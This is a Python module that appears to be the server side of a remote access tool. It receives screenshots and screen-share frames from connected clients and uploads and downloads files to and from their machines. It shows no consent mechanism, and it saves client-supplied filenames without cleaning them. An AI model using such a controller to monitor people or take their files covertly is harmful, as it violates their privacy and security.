import os
import platform
import time
import socket
import colorama # type: ignore  
from colorama import Fore, Style # type: ignore

# Initialize colorama
colorama.init(autoreset=True)

# Import after defining our own functions to avoid circular imports
from modules.server_formatings import format_screenshot_progress, format_client_command_help
from modules.server_ui_utils import print_banner, clear_screen # type: ignore

def handle_client_disconnect(client_id, client_sockets, active_client=None):
    """Handle client disconnection"""
    if client_sockets[client_id]:
        try:
            client_sockets[client_id].close()
        except:
            pass
        client_sockets[client_id] = None
        
    print(f"{Fore.RED}Client {client_id} disconnected{Style.RESET_ALL}")
    
    # Update active client if this was the active one and active_client was provided
    if active_client is not None and active_client == client_id:
        return -1
    return active_client if active_client is not None else None

def receive_screenshot(client_socket, BUFFER_SIZE):
    """Receive screenshot data from client and save to file"""
    try:
        # First receive the file size
        size_data = client_socket.recv(8)
        file_size = int.from_bytes(size_data, byteorder='big')
        
        # Create screenshots directory if it doesn't exist
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        
        # Generate filename with timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshots/screenshot_{timestamp}.png"
        
        # Calculate box dimensions once
        filename_display = f"Downloading screenshot to {filename}"
        box_width = max(len(filename_display) + 4, 56)
        
        # Calculate progress bar components with exact spacing
        # Fixed width for progress text to ensure consistency
        progress_text = "  0.00% " # Added an extra space at the beginning
        # Account for the exact number of characters in the box borders
        bar_length = box_width - len(progress_text) - 4  # 4 for "║ " and " ║"
        
        # Print the box with exact width
        print(f"{Fore.CYAN}╔{'═' * (box_width - 2)+'═'}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}{filename_display}{' ' * (box_width - len(filename_display) - 3)}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{'░' * bar_length}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═' * (box_width - 2)+'═'}╝{Style.RESET_ALL}")
        
        # Move cursor up to the progress bar line
        print(f"\033[2A", end="")
        
        # Receive and save the file
        bytes_received = 0
        with open(filename, "wb") as f:
            while bytes_received < file_size:
                # Receive data in chunks
                chunk_size = min(BUFFER_SIZE, file_size - bytes_received)
                chunk = client_socket.recv(chunk_size)
                
                if not chunk:
                    break
                
                f.write(chunk)
                bytes_received += len(chunk)
                
                # Update progress bar in place
                progress = (bytes_received / file_size) * 100
                # Ensure consistent width for progress text
                progress_text = f"  {progress:6.2f}% " # Added an extra space at the beginning
                filled_length = int(bar_length * progress / 100)
                # Ensure bar doesn't exceed allocated space
                filled_length = min(filled_length, bar_length)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                # Move to beginning of line and update progress bar
                # Ensure exact character count matches initial display
                print(f"\r{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}", end="")
            
            # Move cursor down past the box bottom after completion
            print("\n\n")
        
        print(f"{Fore.GREEN}Screenshot saved to {filename}{Style.RESET_ALL}")
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error receiving screenshot: {str(e)}{Style.RESET_ALL}")
        return None

def receive_screen_share(client_socket, BUFFER_SIZE):
    """Receive screen sharing stream from client and save frames"""
    try:
        import threading
        import queue
        
        # Create screenshots directory if it doesn't exist
        if not os.path.exists("screen_share"):
            os.makedirs("screen_share")
        
        print(f"{Fore.CYAN}╔════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}🖥️  SCREEN SHARING SESSION ACTIVE{Style.RESET_ALL}{' ' * 14} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Receiving live screen stream...{Style.RESET_ALL}{' ' * 17} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}Press Ctrl+C to stop screen sharing{Style.RESET_ALL}{' ' * 12} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        frame_count = 0
        
        # Wait for screen sharing start marker
        marker_data = b""
        start_marker = b"##SCREEN_SHARE_START##"
        while start_marker not in marker_data:
            chunk = client_socket.recv(1024)
            if not chunk:
                print(f"{Fore.RED}Connection lost while waiting for screen share start{Style.RESET_ALL}")
                return False
            marker_data += chunk
            # Limit buffer size to prevent memory issues
            if len(marker_data) > 10240:  # 10KB limit
                marker_data = marker_data[-5120:]  # Keep last 5KB
        
        print(f"{Fore.GREEN}Screen sharing started! Receiving frames...{Style.RESET_ALL}")
        
        while True:
            try:
                # Receive frame size (4 bytes)
                size_data = b""
                while len(size_data) < 4:
                    chunk = client_socket.recv(4 - len(size_data))
                    if not chunk:
                        print(f"{Fore.YELLOW}Connection closed by client{Style.RESET_ALL}")
                        return True
                    size_data += chunk
                
                # Convert bytes to frame size (little-endian)
                frame_size = int.from_bytes(size_data, byteorder='little')
                
                # Check for end marker in the size data
                if b"##SCREEN_SHARE_END##" in size_data:
                    print(f"{Fore.YELLOW}Screen sharing ended by client{Style.RESET_ALL}")
                    return True
                
                # Validate frame size (should be reasonable for JPEG)
                if frame_size > 10 * 1024 * 1024:  # Max 10MB per frame
                    print(f"{Fore.RED}Invalid frame size: {frame_size} bytes{Style.RESET_ALL}")
                    continue
                
                # Receive frame data
                frame_data = b""
                bytes_received = 0
                
                while bytes_received < frame_size:
                    chunk_size = min(BUFFER_SIZE, frame_size - bytes_received)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        print(f"{Fore.RED}Connection lost while receiving frame{Style.RESET_ALL}")
                        return False
                    frame_data += chunk
                    bytes_received += len(chunk)
                
                # Save frame to file
                frame_count += 1
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                filename = f"screen_share/frame_{timestamp}_{frame_count:04d}.jpg"
                
                with open(filename, "wb") as f:
                    f.write(frame_data)
                
                # Show progress every 10 frames
                if frame_count % 10 == 0:
                    print(f"{Fore.GREEN}Received frame {frame_count} ({len(frame_data)} bytes) -> {filename}{Style.RESET_ALL}")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Screen sharing stopped by user{Style.RESET_ALL}")
                # Send stop command to client
                try:
                    client_socket.send("stop_screen_share".encode())
                except:
                    pass
                return True
            except Exception as e:
                print(f"{Fore.RED}Error receiving frame: {str(e)}{Style.RESET_ALL}")
                # Try to continue receiving, might be a temporary error
                continue
        
    except Exception as e:
        print(f"{Fore.RED}Error in screen sharing session: {str(e)}{Style.RESET_ALL}")
        return False

def upload_file(client_socket, file_path, buffer_size=1024):
    """Upload a file from server to client
    
    Args:
        client_socket: The socket connected to the client
        file_path: Path to the file to upload
        buffer_size: Buffer size for sending data
        
    Returns:
        bool: True if upload was successful, False otherwise
    """
    try:
        # Check if file exists
        if not os.path.exists(file_path):
            print(f"{Fore.RED}Error: File not found: {file_path}{Style.RESET_ALL}")
            return False
            
        # Get file size
        file_size = os.path.getsize(file_path)
        
        # Print upload box header
        print(f"{Fore.CYAN}╔════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} Uploading {os.path.basename(file_path)}{' ' * (40 - len(os.path.basename(file_path)))}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{'░' * 40}{Style.RESET_ALL}   0.00% {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Move cursor up to the progress bar line
        print(f"\033[2A", end="")
        
        # Send command with destination path (preserve full filename with extension)
        filename = os.path.basename(file_path)
        # Send just the filename - client will place it in appropriate location
        command = f"upload_file {filename}"
        print(f"{Fore.CYAN}Debug: Sending command: {command}{Style.RESET_ALL}")
        client_socket.send(command.encode())
        
        # Wait for acknowledgment
        response = client_socket.recv(buffer_size).decode('utf-8', errors='replace')
        print(f"{Fore.CYAN}Debug: Client response: {response}{Style.RESET_ALL}")
        if "Ready to receive" not in response:
            print(f"\n\n{Fore.RED}Error: Client not ready to receive file: {response}{Style.RESET_ALL}")
            return False
        
        # Longer delay to ensure client is ready and has exited command processing
        import time
        time.sleep(0.5)
        
        # Send file size (8 bytes)
        client_socket.send(file_size.to_bytes(8, byteorder='big'))
        print(f"{Fore.CYAN}Debug: Sent file size: {file_size} bytes{Style.RESET_ALL}")
        
        # Send file data in chunks
        bytes_sent = 0
        with open(file_path, 'rb') as f:
            while bytes_sent < file_size:
                # Read a chunk of data
                chunk = f.read(buffer_size)
                if not chunk:
                    break
                    
                # Send the chunk
                client_socket.send(chunk)
                bytes_sent += len(chunk)
                
                # Update progress bar
                progress = (bytes_sent / file_size) * 100
                filled_length = int(40 * progress / 100)
                bar = '█' * filled_length + '░' * (40 - filled_length)
                
                # Move to beginning of line and update progress bar
                print(f"\r{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL}   {progress:5.2f}% {Fore.CYAN}║{Style.RESET_ALL}", end="")
        
        # Move cursor down past the box bottom after completion
        print("\n\n")
        print(f"{Fore.GREEN}File upload completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}File uploaded successfully{Style.RESET_ALL}")
        return True
            
    except Exception as e:
        print(f"\n\n{Fore.RED}Error uploading file: {str(e)}{Style.RESET_ALL}")
        return False

def download_file(client_socket, remote_path, local_path=None, buffer_size=1024):
    """Download a file from client to server
    
    Args:
        client_socket: The socket connected to the client
        remote_path: Path to the file on the client
        local_path: Path to save the file on the server (if None, use the filename from remote_path)
        buffer_size: Buffer size for receiving data
        
    Returns:
        str: Path to the downloaded file if successful, None otherwise
    """
    try:
        # Send command to download file
        command = f"download_file {remote_path}"
        print(f"{Fore.CYAN}Debug: Sending command: {command}{Style.RESET_ALL}")
        client_socket.send(command.encode())
        
        # Wait for acknowledgment
        print(f"{Fore.CYAN}Debug: Waiting for client response...{Style.RESET_ALL}")
        response = client_socket.recv(buffer_size).decode('utf-8', errors='replace')
        print(f"{Fore.CYAN}Debug: Client response: {response}{Style.RESET_ALL}")
        
        if "File not found" in response:
            print(f"{Fore.RED}Error: {response}{Style.RESET_ALL}")
            return None
        elif "File found" not in response:
            print(f"{Fore.RED}Error: Unexpected response: {response}{Style.RESET_ALL}")
            return None
        
        # Receive file size (8 bytes)
        size_data = client_socket.recv(8)
        if len(size_data) != 8:
            print(f"{Fore.RED}Error: Failed to receive file size (got {len(size_data)} bytes){Style.RESET_ALL}")
            return None
        file_size = int.from_bytes(size_data, byteorder='big')
        print(f"{Fore.CYAN}Debug: File size received: {file_size} bytes{Style.RESET_ALL}")
        
        # Receive file name length (size_t - 8 bytes on Windows x64)
        name_length_data = client_socket.recv(8)
        if len(name_length_data) != 8:
            print(f"{Fore.RED}Error: Failed to receive filename length{Style.RESET_ALL}")
            return None
        name_length = int.from_bytes(name_length_data, byteorder='little')  # Windows uses little-endian
        
        # Receive file name
        file_name_data = b""
        while len(file_name_data) < name_length:
            chunk = client_socket.recv(name_length - len(file_name_data))
            if not chunk:
                print(f"{Fore.RED}Error: Connection lost while receiving filename{Style.RESET_ALL}")
                return None
            file_name_data += chunk
        file_name = file_name_data.decode('utf-8', errors='replace')
        
        # Determine local path
        if not local_path:
            # Create downloads directory if it doesn't exist
            if not os.path.exists("downloads"):
                os.makedirs("downloads")
            local_path = os.path.join("downloads", file_name)
        
        # Calculate box dimensions
        filename_display = f"Downloading {file_name}"
        box_width = max(len(filename_display) + 4, 56)
        
        # Calculate progress bar components
        progress_text = "  0.00% "
        bar_length = box_width - len(progress_text) - 4
        
        # Print the box
        print(f"{Fore.CYAN}╔{'═' * (box_width - 2)+'═'}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}{filename_display}{' ' * (box_width - len(filename_display) - 3)}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{'░' * bar_length}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═' * (box_width - 2)+'═'}╝{Style.RESET_ALL}")
        
        # Move cursor up to the progress bar line
        print(f"\033[2A", end="")
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)
        
        # Receive and save the file
        bytes_received = 0
        with open(local_path, "wb") as f:
            while bytes_received < file_size:
                # Receive data in chunks
                chunk_size = min(buffer_size, file_size - bytes_received)
                chunk = client_socket.recv(chunk_size)
                
                if not chunk:
                    break
                
                f.write(chunk)
                bytes_received += len(chunk)
                
                # Update progress bar
                progress = (bytes_received / file_size) * 100
                progress_text = f"  {progress:6.2f}% "
                filled_length = int(bar_length * progress / 100)
                filled_length = min(filled_length, bar_length)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                # Move to beginning of line and update progress bar
                print(f"\r{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{bar}{Style.RESET_ALL}{progress_text}{Fore.CYAN}║{Style.RESET_ALL}", end="")
        
        # Move cursor down past the box bottom after completion
        print("\n\n")
        
        # Send confirmation to client
        client_socket.send("FILE_RECEIVED_SUCCESSFULLY".encode())
        
        print(f"{Fore.GREEN}File downloaded successfully to {local_path}{Style.RESET_ALL}")
        return local_path
        
    except Exception as e:
        print(f"\n\n{Fore.RED}Error downloading file: {str(e)}{Style.RESET_ALL}")
        return None

def show_client_commands():
    """Show available client commands"""
    # Use the formatted client command help from server_formatings.py
    from modules.server_formatings import format_client_command_help
    formatted_help = format_client_command_help()
    print(formatted_help)




